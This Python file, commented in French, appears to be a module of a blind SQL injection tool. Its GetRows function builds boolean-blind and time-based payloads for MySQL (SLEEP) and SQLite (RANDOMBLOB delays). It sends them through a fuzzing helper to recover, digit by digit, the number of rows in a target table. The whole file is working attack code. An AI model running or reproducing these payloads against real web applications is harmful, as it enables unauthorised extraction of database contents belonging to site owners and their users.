#coding-utf8
from lib.req import *
from lib.req import *

def GetRows(setting):

	# Récupération des informations lier à la requête HTTP
	dbms = setting['dbms']
	sqli_type = setting['sqli_type']
	tofind = setting['tofind']
	escape = setting['escape']
	comment = setting['comment']
	operator = setting['operator']

	table = setting['table']
	column = setting['column']

	if dbms == 'SQLite':
		p_time = 9
	else:
		p_time = setting['p_time']

	num_rows = False
	nextchar = 1 
	valid = ''
	i = 0
	while i < 10:
		for num in range(0,10):# De 0 à 9
			num = ord(str(num))# Transformation de num en ASCII

			if dbms == 'MySQL':

				if sqli_type == 'BSQLI':# Création d'un payload pour SQLi blind

					payload ='{} {} ASCII(substr((SELECT COUNT({}) from {}), {},1))={}{}'.format(escape, operator, column, table, nextchar, str(num), comment)

				else:# Création d'un payload pour SQLi Total Blind

					payload = '{} {} (SELECT SLEEP({}) WHERE ASCII(substr((SELECT COUNT({}) from {}), {},1))={}){}'.format(escape, operator, p_time, column, table, nextchar, str(num), comment)
			else:

				if sqli_type == 'BSQLI':

					payload = '{} {} (SELECT substr(count({}),{},1) from {}) = CHAR({}) {}'.format(escape, operator, column, nextchar, table, str(num), comment)

				else:

					payload = '{} {} (select 1=LIKE(1,UPPER(HEX(RANDOMBLOB({}00000000/2)))) WHERE (SELECT substr(count({}),{},1) from {}) = CHAR({})) {}'.format(escape, operator, p_time, column, nextchar, table, str(num), comment)

			if Fuzz(setting, payload):# Si c'est trouvée
				i = 0# On met i à 0 pour continuer la boucles
				nextchar += 1# On ajoute +1 a nextchar pour analyser le prochaine caractère
				valid += chr(int(num))

			i +=1# +1 s'ajoute fur à mesure, et si rien n'est trouver, alors la boucles se coupe

	if valid != '':# Si on n'a un résultat on le stock

		num_rows = int(valid)

	else: 

		num_rows += 0# SI c'est pas trouvée on met 0 à rows

	return num_rows